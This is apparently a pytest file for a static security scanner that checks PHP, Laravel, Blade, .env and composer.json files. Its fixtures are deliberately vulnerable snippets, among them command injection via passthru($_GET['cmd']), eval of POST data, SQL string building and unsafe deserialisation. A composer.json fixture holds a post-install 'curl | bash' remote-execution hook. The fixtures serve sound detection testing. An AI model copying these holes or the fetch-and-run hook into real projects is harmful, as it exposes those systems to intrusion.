"""PHP, Laravel, Blade, composer.json and .env rules."""

from __future__ import annotations

from pathlib import Path

import pytest

from argus_languages import scan_directory
from argus_languages.discover import discover_files


def _rules_for(tmp_path: Path, name: str, code: str) -> set[str]:
    path = tmp_path / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(code)
    return {f.rule_id for f in scan_directory(tmp_path).findings}


@pytest.mark.parametrize(
    ("code", "rule"),
    [
        ('echo "Hello " . $_GET["name"];', "php-xss-echo"),
        ('print("<p>" . $_REQUEST["msg"] . "</p>");', "php-xss-echo"),
        ("<div><?= $_GET['q'] ?></div>", "php-xss-echo"),
        ("include $_GET['page'];", "php-include-user-input"),
        ("require_once($page . '.php');", "php-include-variable-path"),
        ('$db->query("SELECT * FROM users WHERE id = " . $_GET["id"]);', "php-sql-string-build"),
        ("$pdo->query(\"SELECT * FROM users WHERE name = '$name'\");", "php-sql-string-build"),
        ("$q = 'SELECT * FROM t WHERE a LIKE ' . $term;", "php-sql-string-build"),
        ('system("ping -c 1 " . $host);', "php-command-injection"),
        ("passthru($_GET['cmd']);", "php-command-injection"),
        ("$out = `ls $dir`;", "php-backtick-exec"),
        ("eval($_POST['code']);", "php-eval"),
        ("$o = unserialize(base64_decode($_COOKIE['d']));", "php-deserialize"),
        ("extract($_GET);", "php-extract-user-input"),
        ("readfile('uploads/' . $_GET['f']);", "php-path-traversal"),
        ("file_get_contents($_GET['url']);", "php-path-traversal"),
        ("curl_init($_POST['endpoint']);", "php-ssrf-curl"),
        (
            "move_uploaded_file($_FILES['f']['tmp_name'], 'up/' . $_FILES['f']['name']);",
            "php-upload-client-filename",
        ),
        ("$hash = md5($_POST['password']);", "php-weak-password-hash"),
        ("openssl_encrypt($data, 'des-ede3-cbc', $key);", "php-weak-cipher"),
        ("openssl_encrypt($data, 'aes-128-ecb', $key);", "php-weak-cipher"),
        ("header('Location: ' . $_GET['next']);", "php-open-redirect"),
        ("phpinfo();", "php-phpinfo"),
        ("ini_set('display_errors', '1');", "php-display-errors"),
    ],
)
def test_php_vulnerable_code(tmp_path: Path, code: str, rule: str) -> None:
    assert rule in _rules_for(tmp_path, "app.php", f"<?php\n{code}\n")


@pytest.mark.parametrize(
    "code",
    [
        "echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');",
        "echo e($request->input('name'));",
        "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');",
        "$label = 'SELECT an option below';",
        'DB::statement("ALTER TABLE {$prefix}pages ENGINE = InnoDB;");',
        '$sql = "UPDATE {$a} SET {$a}.n=(SELECT count(*) FROM {$b} WHERE {$b}.id={$a}.id)";',
        "$q = DB::raw('(SELECT c FROM ' . $commentsTable . ' c1)');",
        "$result = curl_exec($ch);",
        "$fs = new Filesystem();",
        "$pdo->exec('SET NAMES utf8');",
        "system('ls -la ' . escapeshellarg($dir));",
        "$checksum = md5_file(__FILE__);",
        "$key = md5($email);",
        "$hash = password_hash($_POST['password'], PASSWORD_DEFAULT);",
        "require $maintenance;",
        "include __DIR__ . '/pages/home.php';",
        "$data = json_decode($_COOKIE['data'], true);",
        "$version = trim(file_get_contents($versionFile));",
        " * Possible values: sha1, sha256 (docblock)",
    ],
)
def test_php_safe_code_has_no_findings(tmp_path: Path, code: str) -> None:
    assert _rules_for(tmp_path, "app.php", f"<?php\n{code}\n") == set()


@pytest.mark.parametrize(
    ("code", "rule"),
    [
        ("DB::select(\"SELECT * FROM users WHERE name = '$request->name'\");", "laravel-raw-sql"),
        ("User::whereRaw('email = ' . $request->input('email'))->get();", "laravel-raw-sql"),
        ("User::orderByRaw($request->input('sort'))->get();", "laravel-raw-sql"),
        ("User::create($request->all());", "laravel-mass-assignment-request-all"),
        ("$user->update($request->all());", "laravel-mass-assignment-request-all"),
        ("protected $guarded = [];", "laravel-guarded-empty"),
        ("Model::unguard();", "laravel-unguard"),
        ("return redirect($request->input('next'));", "laravel-open-redirect"),
        ("return redirect()->away(request('url'));", "laravel-open-redirect"),
        ("protected $except = ['*'];", "laravel-csrf-disabled"),
        ("$middleware->validateCsrfTokens(except: ['*']);", "laravel-csrf-disabled"),
        ("'debug' => true,", "laravel-debug-hardcoded"),
        ("'debug' => (bool) env('APP_DEBUG', true),", "laravel-debug-default-true"),
        (
            "$f->storeAs('avatars', $f->getClientOriginalName());",
            "laravel-upload-original-name",
        ),
        ("return Storage::download($request->input('path'));", "laravel-path-traversal"),
    ],
)
def test_laravel_vulnerable_code(tmp_path: Path, code: str, rule: str) -> None:
    assert rule in _rules_for(tmp_path, "app/Http/Controllers/C.php", f"<?php\n{code}\n")


@pytest.mark.parametrize(
    "code",
    [
        "DB::select('SELECT * FROM users WHERE name = ?', [$request->input('name')]);",
        "User::whereRaw('email = ?', [$request->input('email')])->get();",
        "User::create($request->validated());",
        "$user->update($request->only(['name', 'email']));",
        "protected $guarded = ['id', 'is_admin'];",
        "return redirect()->route('home');",
        "'debug' => (bool) env('APP_DEBUG', false),",
        "$request->file('avatar')->store('avatars');",
    ],
)
def test_laravel_safe_code_has_no_findings(tmp_path: Path, code: str) -> None:
    assert _rules_for(tmp_path, "app/Http/Controllers/C.php", f"<?php\n{code}\n") == set()


def test_blade_rules(tmp_path: Path) -> None:
    view = tmp_path / "resources/views/profile.blade.php"
    view.parent.mkdir(parents=True)
    view.write_text(
        "<h1>{!! $request->input('name') !!}</h1>\n"
        "<div>{!! $user->bio !!}</div>\n"
        "<h1>{{ $request->input('name') }}</h1>\n"
        "<form>{!! csrf_field() !!}</form>\n"
        "<p>{!! trans('settings.desc') !!}</p>\n"
        "{!! $books->links() !!}\n"
        "<span>{!! nl2br(e($msg)) !!}</span>\n"
        "{{-- {!! $old !!} --}}\n"
        "@include($block->getView())\n"
    )
    found = {(f.line, f.rule_id) for f in scan_directory(tmp_path).findings}
    assert found == {(1, "laravel-blade-unescaped-input"), (2, "laravel-blade-unescaped")}


def test_env_files(tmp_path: Path) -> None:
    (tmp_path / ".env.production").write_text(
        "APP_ENV=local\nAPP_DEBUG=true\nAPP_KEY=base64:Zm9vYmFyYmF6cXV4Zm9vYmFyYmF6cXV4Zm9vYmFyYmE=\n"
        "TELESCOPE_ENABLED=true\nSESSION_SECURE_COOKIE=false\n"
    )
    (tmp_path / ".env.example").write_text("APP_KEY=\nAPP_DEBUG=true\nSESSION_ENCRYPT=false\n")
    (tmp_path / ".env").write_text('APP_DEBUG=true\nDB_PASSWORD="local-only-secret"\n')

    found = {(f.file, f.rule_id) for f in scan_directory(tmp_path).findings}

    assert found == {
        (".env.production", "laravel-env-local-production"),
        (".env.production", "laravel-env-debug-production"),
        (".env.production", "laravel-app-key-committed"),
        (".env.production", "laravel-env-debug-tools-production"),
        (".env.production", "laravel-env-insecure-session-cookie"),
    }


def test_composer_json(tmp_path: Path) -> None:
    (tmp_path / "composer.json").write_text(
        '{\n  "minimum-stability": "dev",\n'
        '  "repositories": [{"type": "composer", "url": "http://packages.example"}],\n'
        '  "config": {\n    "secure-http": false,\n    "disable-tls": true,\n'
        '    "allow-plugins": true\n  },\n'
        '  "scripts": {"post-install-cmd": ["curl -s https://x.example | bash"]}\n}\n'
    )
    rules = {f.rule_id for f in scan_directory(tmp_path).findings}
    assert rules == {
        "composer-minimum-stability-dev",
        "composer-insecure-repository",
        "composer-secure-http-disabled",
        "composer-disable-tls",
        "composer-allow-all-plugins",
        "composer-script-remote-exec",
    }


def test_safe_composer_json(tmp_path: Path) -> None:
    (tmp_path / "composer.json").write_text(
        '{\n  "minimum-stability": "stable",\n'
        '  "repositories": [{"type": "composer", "url": "https://packages.example"}],\n'
        '  "config": {"secure-http": true, "allow-plugins": {"php-http/discovery": true}},\n'
        '  "scripts": {"post-install-cmd": ["@php artisan package:discover"]}\n}\n'
    )
    assert scan_directory(tmp_path).findings == []


def test_discovery_of_php_family_files(tmp_path: Path) -> None:
    for name in (
        "composer.json",
        ".env.production",
        ".env.example",
        ".env",
        "resources/views/a.blade.php",
        "app/A.php",
        ".git/config.php",
    ):
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("<?php\n" if name.endswith(".php") else "x\n")

    langs = {f.relative: f.language for f in discover_files(tmp_path)}

    assert langs == {
        "composer.json": "composer",
        ".env.production": "dotenv-production",
        ".env.example": "dotenv-example",
        "resources/views/a.blade.php": "blade",
        "app/A.php": "php",
    }


def test_weak_crypto_word_boundaries_other_languages(tmp_path: Path) -> None:
    assert "weak-crypto" in _rules_for(tmp_path, "a.py", "h = hashlib.md5(data)\n")
    assert "weak-crypto" in _rules_for(tmp_path, "b.java", 'Cipher.getInstance("DESede");\n')
    assert "weak-crypto" not in _rules_for(tmp_path / "c", "c.py", 'description = "error codes"\n')
